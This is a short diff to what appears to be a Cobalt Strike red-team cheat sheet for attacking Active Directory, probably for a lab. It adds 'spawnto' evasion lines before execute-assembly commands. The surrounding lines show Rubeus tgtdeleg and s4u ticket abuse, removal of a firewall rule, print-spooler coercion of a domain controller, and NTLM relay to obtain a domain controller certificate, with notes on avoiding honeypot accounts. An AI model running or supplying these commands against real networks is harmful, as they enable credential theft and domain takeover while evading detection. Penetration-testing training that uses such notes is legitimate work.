@@ -386,6 +386,7 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonat
 ```
 >Rubeus use the Kerberos unconstrained delegation to obtain a TGT for current beacon user without needing credentials. run in any beacon  
 ```cs
+spawnto x64 %windir%\sysnative\dllhost.exe
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
 ```
 >Rubeus Obtain HASH value for only mssql_svc account and not triggering honeypot accounts, remain  
@@ -573,6 +574,7 @@ powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
 >OPSEC-🟠CAUTION  
 >Coerce DC to authenticate to Web Server  
 ```cs
+spawnto x64 %windir%\sysnative\dllhost.exe
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
 ```
 >Relay credentials for domain controller, so we request a DomainController certificate. On the Kali Linux Docker instance start `NTLMRelayX`  
